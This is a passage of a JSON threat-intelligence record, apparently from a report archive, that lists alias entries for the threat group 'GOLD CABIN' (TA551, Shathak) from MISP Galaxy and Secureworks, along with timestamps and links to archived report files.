            "id": "90f216f2-4897-46fc-bb76-3acae9d112ca",
            "created_at": "2023-01-06T13:46:39.248936Z",
            "updated_at": "2025-03-27T02:00:03.031127Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "Shakthak",
                "TA551",
                "ATK236",
                "G0127",
                "Monster Libra"
            ],
            "source_name": "MISPGALAXY:GOLD CABIN",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "40b623c7-b621-48db-b55b-dd4f6746fbc6",
            "created_at": "2024-06-19T02:03:08.017681Z",
            "updated_at": "2025-03-27T02:05:17.342829Z",
            "deleted_at": null,
            "main_name": "GOLD CABIN",
            "aliases": [
                "TA551 ",
                "Shathak"
            ],
            "source_name": "Secureworks:GOLD CABIN",
            "tools": [
                ""
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535861,
    "ts_updated_at": 1743041638,
    "ts_creation_date": 1653489472,
    "ts_modification_date": 1653489472,
    "files": {
        "pdf": "https://archive.orkl.eu/666350a941b7f8cbe99971e51836575e3f55c95d.pdf",
        "text": "https://archive.orkl.eu/666350a941b7f8cbe99971e51836575e3f55c95d.txt",
        "img": "https://archive.orkl.eu/666350a941b7f8cbe99971e51836575e3f55c95d.jpg"
    }
}